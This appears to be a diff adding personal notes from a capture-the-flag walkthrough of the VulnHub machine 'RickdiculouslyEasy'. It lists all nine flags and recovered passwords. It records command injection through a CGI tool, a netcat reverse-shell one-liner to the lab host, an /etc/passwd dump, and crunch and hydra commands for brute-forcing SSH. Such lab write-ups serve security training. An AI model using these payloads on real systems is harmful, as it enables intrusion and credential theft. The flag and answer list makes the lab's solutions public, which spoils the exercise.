@@ -1,0 +1,174 @@
+https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/
+Goal: 130 points of flags
+
+Flags: 
+FLAG:{TheyFoundMyBackDoorMorty}-10Points
+FLAG{Yeah d- just don't do it.} - 10 Points
+FLAG{Whoa this is unexpected} - 10 Points
+FLAG {There is no Zeus, in your face!} - 10 Points
+FLAG{Flip the pickle Morty!} - 10 Points 
+FLAG{Get off the high road Summer!} - 10 Points
+FLAG: {131333} - 20 Points 
+FLAG{And Awwwaaaaayyyy we Go!} - 20 Points
+FLAG: {Ionic Defibrillator} - 30 points
+
+
+
+
+Users:
+RickSanchez (P7Curtains)
+Morty
+Summer (winter)
+
+
+Possible passwords
+winter (this is Summer's, ssh)
+
+
+
+
+
+
+
+Information
+
+IP Address: 192.168.83.118
+Ports:
+  21 - ftp (vsftpd 3.0.3)(anonymous login)
+  22 - ssh
+  80 - http (Apache httpd 2.4.27, Fedora)
+  9090 - zeus-admin (http, Cockpit web service)
+  13337 - unknown (unknown, probably only for the flag)
+  22222 - easyengine (OpenSSH 7.5 (protocol 2.0)
+  60000 - unknown (some type of reverse shell based on scan)
+
+
+
+
+START
+
+Full nmap scan. Found in 13337
+  Flag 1: FLAG:{TheyFoundMyBackDoorMorty}-10Points
+
+Website
+  Looks like nothing. Will enumerate.
+	robots.txt > /cgi-bin/root_shell.cgi & /cgi-bin/tracertool.cgi
+	root_shell is nothing (typical Rick)
+	tracertool is valid
+
+  Tracertool outputs straight logs
+	start command with semi-colon to use as a shell
+		pwd = /var/www/cgi-bin
+		reverse shell = ; nc -e /bin/sh 192.168.83.107 4444
+	reverse shell, under /var/www/html is a file: passwords
+		cat passwords prints a cat (typical Rick). Go to the webpage
+
+192.168.83.118/passwords is vaild (should've found with dirb)
+FLAG.txt
+  Flag 2: FLAG{Yeah d- just don't do it.} - 10 Points
+
+http://192.168.83.118/passwords/passwords.html > comment Password:winter
+
+FTP: 
+format User:  anonymous Password:  anonymous@domain.com
+FLAG.txt is listed, download via get
+  Flag 3: FLAG{Whoa this is unexpected} - 10 Points
+nothing else seems to be here
+
+SSH:
+1st attempt connection not valid
+
+9090:
+Found flag on page 
+  Flag 4: FLAG {There is no Zeus, in your face!} - 10 Points
+Try password 'winter'? - no
+maybe this is it?
+
+13337:
+nothing 
+
+22222:
+ssh, username,password? root/winter, rick/winter = no
+
+60000:
+telnet in
+found flag
+  Flag 5: FLAG{Flip the pickle Morty!} - 10 Points 
+
+
+OK, stupid stupid stupid got off track
+Go back to reverse shell from iptrace and see users or something
+
+passwd:
+rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
+abrt:x:173:173::/etc/abrt:/sbin/nologin
+cockpit-ws:x:996:994:User for cockpit-ws:/:/sbin/nologin
+rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+chrony:x:995:993::/var/lib/chrony:/sbin/nologin
+tcpdump:x:72:72::/:/sbin/nologin
+RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
+Morty:x:1001:1001::/home/Morty:/bin/bash
+Summer:x:1002:1002::/home/Summer:/bin/bash
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+
+
+Ok trying ssh (p 22222) with RickSanchez, Morty, Summer with password 'winter'
+Summer/winter = good
+
+Found flag
+  Flag 6: FLAG{Get off the high road Summer!} - 10 Points
+
+Tryout Morty's file. journal.txt.zip. Safe_Password.jpg
+/home/Morty/
+
+RickSanchez's
+/home/RickSanchez/RICKS_SAFE/safe
+
+
+
+Safe_Password.jpg
+ nothing as a picture
+ cat > The Safe Password: File: /home/Morty/journal.txt.zip Password: Meeseek8BIM
+not Meeseek8BIM, extra junk behind > just Meeseek
+Flag found
+  Flag 7: FLAG: {131333} - 20 Points 
+Also thing about safe password
+
+
+Try to run progam 'safe' > cat safe > Past Rick to present Rick, tell future Rick to use GOD DAMN COMMAND LINE AAAAAHHAHAGGGGRRGUMENTS!AAAAAAAAAAAAAAAAd
+can't run this as myself, need to ssh again
+Can't run as Summer
+Copy as Summer, run as Summer
+  Flag 8: FLAG{And Awwwaaaaayyyy we Go!} - 20 Points
+
+Decrypt says that Rick's password is, in order:
+1 uppercase character
+1 digit
+One of the words in my old bands name. (google it)
+
+(A-Z)(0-9)(Flesh or Curtains)
+
+OK use crunch to create https://tools.kali.org/password-attacks/crunch
+
+crunch options
+min-len 7
+max-len 7
+-t ,%Flesh
+
+min 10
+max 10
+-t ,%Curtains
+
+crunch 7 7 -t ,%Flesh > passwords.txt
+crunch 10 10 -t ,%Curtains >> passwords.txt
+
+using hydra to check (vs RickSanchez and root)
+
+hydra gives us password RickSanchez:P7Curtains
+login works
+can get root
+found flag
+  Flag 9: FLAG: {Ionic Defibrillator} - 30 points
+
+
+END
